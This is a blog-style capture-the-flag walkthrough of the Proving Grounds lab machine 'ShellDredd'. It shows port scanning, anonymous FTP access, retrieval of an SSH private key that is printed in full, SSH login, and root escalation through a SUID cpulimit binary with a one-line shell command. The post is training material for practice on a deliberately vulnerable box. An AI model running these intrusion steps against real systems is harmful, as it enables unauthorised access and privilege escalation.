---
layout: post
author: H4
---

This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery

Starting with a simple `nmap` scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn -p- 192.168.76.130    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-20 14:41 EST
Nmap scan report for 192.168.76.130
Host is up (0.057s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp    open  ftp
61000/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.15 seconds
```

Identifying the services.
```bash
$ nmap -Pn -p21,61000 -sV 192.168.76.130
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-20 14:57 EST
Nmap scan report for 192.168.76.130
Host is up (0.033s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
61000/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
```

> So, the service on port `61000` is `ssh`.
{: .prompt-info }

---

# exploitation

## port 21 (`ftp`)
```bash
$ ftp 192.168.76.130
Connected to 192.168.76.130.
220 (vsFTPd 3.0.3)
Name (192.168.76.130:void): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

> Anonymous access is allowed!
{: .prompt-info }

### investigating the `ftp` service
```bash
ftp> dir -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        115          4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .hannah
226 Directory send OK.
ftp> cd .hannah
250 Directory successfully changed.
ftp> dir -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
-rwxr-xr-x    1 0        0            1823 Aug 06  2020 id_rsa
226 Directory send OK.
```

### downloading the `id_rsa` file
```bash
ftp> get id_rsa
local: id_rsa remote: id_rsa
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for id_rsa (1823 bytes).
226 Transfer complete.
1823 bytes received in 0.00 secs (12.4182 MB/s)
ftp> exit
221 Goodbye.

$ cat id_rsa           
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA1+dMq5Furk3CdxomSts5UsflONuLrAhtWzxvzmDk/fwk9ZZJMYSr
/B76klXVvqrJrZaSPuFhpRiuNr6VybSTrHB3Db7cbJvNrYiovyOOI92fsQ4EDQ1tssS0WR
6iOBdS9dndBF17vOqtHgJIIJPGgCsGpVKXkkMZUbDZDMibs4A26oXjdhjNs74npBq8gqvX
Y4RltqCayDQ67g3tLw8Gpe556tIxt1OlfNWp3mgCxVLE1/FE9S6JP+LeJtF6ctnzMIfdmd
GtlWLJdFmA4Rek1VxEEOskzP/jW9LXn2ebrRd3yG6SEO6o9+uUzLUr3tv9eLSR63Lkh1jz
n5GAP3ogHwAAA8hHmUHbR5lB2wAAAAdzc2gtcnNhAAABAQDX50yrkW6uTcJ3GiZK2zlSx+
U424usCG1bPG/OYOT9/CT1lkkxhKv8HvqSVdW+qsmtlpI+4WGlGK42vpXJtJOscHcNvtxs
m82tiKi/I44j3Z+xDgQNDW2yxLRZHqI4F1L12d0EXXu86q0eAkggk8aAKwalUpeSQxlRsN
kMyJuzgDbqheN2GM2zviekGryCq9djhGW2oJrINDruDe0vDwal7nnq0jG3U6V81aneaALF
UsTX8UT1Lok/4t4m0Xpy2fMwh92Z0a2VYsl0WYDhF6TVXEQQ6yTM/+Nb0tefZ5utF3fIbp
IQ7qj365TMtSve2/14tJHrcuSHWPOfkYA/eiAfAAAAAwEAAQAAAQEAmGDIvfYgtahv7Xtp
Nz/OD1zBrQVWaI5yEAhxqKi+NXu14ha1hdtrPr/mfU1TVARZ3sf8Y6DSN6FZo42TTg7Cgt
vFStA/5e94lFd1MaG4ehu6z01jEos9twQZfSSfvRLJHHctBB2ubUD7+cgGe+eQG3lCcX//
Nd1hi0RTjDAxo9c342/cLR/h3NzU53u7UZJ0U3JLgorUVyonN79zy1VzawL47DocD4DoWC
g8UNdChGGIicgM26OSp28naYNA/5gEEqVGyoh6kyU35qSSLvdGErTMZxVhIfWMVK0hEJGK
yyR15GMmBzDG1PWUqzgbgsJdsHuicEr8CCpaqTEBGpa28QAAAIAoQ2RvULGSqDDu2Salj/
RrfUui6lVd+yo+X7yS8gP6lxsM9in0vUCR3rC/i4yG0WhxsK3GuzfMMdJ82Qc2mQKuc05S
I96Ra9lQolZTZ8orWNkVWrlXF5uiQrbUJ/N5Fld1nvShgYIqSjBKVoFjO5PH4c5aspX5iv
td/kdikaEKmAAAAIEA8tWZGNKyc+pUslJ3nuiPNZzAZMgSp8ZL65TXx+2D1XxR+OnP2Bcd
aHsRkeLw4Mu1JYtk1uLHuQ2OUPm1IZT8XtqmuLo1XMKOC5tAxsj0IpgGPoJf8/2xUqz9tK
LOJK7HN+iwdohkkde9njtfl5Jotq4I5SqKTtIBrtaEjjKZCwUAAACBAOOb6qhGECMwVKCK
9izhqkaCr5j8gtHYBLkHG1Dot3cS4kYvoJ4Xd6AmGnQvB1Bm2PAIA+LurbXpmEp9sQ9+m8
Yy9ZpuPiSXuNdUknlGY6kl+ZY46aes/P5pa34Zk1jWOXw68q86tOUus0A1Gbk1wkaWddye
HvHD9hkCPIq7Sc/TAAAADXJvb3RAT2ZmU2hlbGwBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

> It seems we got a `ssh` key for user `hannah`.
{: .prompt-info }

## port 61000 (`ssh`)
Now we check if we can login with `hannah` using the `ssh` key we just found.
```bash
$ chmod 600 id_rsa 

$ ssh -i id_rsa hannah@192.168.76.130 -p 61000 
Linux ShellDredd 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
hannah@ShellDredd:~$ id
uid=1000(hannah) gid=1000(hannah) groups=1000(hannah),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
```

> We got a shell!
{: .prompt-info }

---

# post exploitation
## get first flag
```bash
hannah@ShellDredd:~$ ls
local.txt  user.txt
hannah@ShellDredd:~$ cat local.txt 
6******************************9
```

## privilege escalation
We start with looking for `SUID` binaries, to check if we can escalate the easy way.
```bash
hannah@ShellDredd:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwxr-sr-x 1 root shadow 39616 Feb 14  2019 /usr/sbin/unix_chkpwd
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwxr-sr-x 1 root tty 34896 Jan 10  2019 /usr/bin/wall
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
-rwsr-sr-x 1 root root 121976 Mar 23  2012 /usr/bin/mawk
-rwxr-sr-x 1 root ssh 321672 Jan 31  2020 /usr/bin/ssh-agent
-rwxr-sr-x 1 root crontab 43568 Oct 11  2019 /usr/bin/crontab
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwxr-sr-x 1 root shadow 71816 Jul 27  2018 /usr/bin/chage
-rwxr-sr-x 1 root shadow 31000 Jul 27  2018 /usr/bin/expiry
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwxr-sr-x 1 root tty 14736 May  4  2018 /usr/bin/bsd-write
-rwsr-xr-x 1 root root 34896 Apr 22  2020 /usr/bin/fusermount
-rwsr-sr-x 1 root root 23072 Jun 23  2017 /usr/bin/cpulimit
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwxr-sr-x 1 root mail 18944 Dec  3  2017 /usr/bin/dotlockfile
```

Checking the results reveals that `mawk` and `cpulimit` may be used for privilege escalation. We will use `cpulimit`. Checking [gtfobins](https://gtfobins.github.io/gtfobins/cpulimit/#suid) shows us how to get `root` access.

```
hannah@ShellDredd:~$ cpulimit -l 100 -f -- /bin/sh -p
Process 1289 detected
# id
uid=1000(hannah) gid=1000(hannah) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(hannah)
```

> Root root!
{: .prompt-info }

## get second flag
```bash
# cd /root
# ls
proof.txt  root.txt
# cat proof.txt
a******************************f
```

Pwned! <@:-)
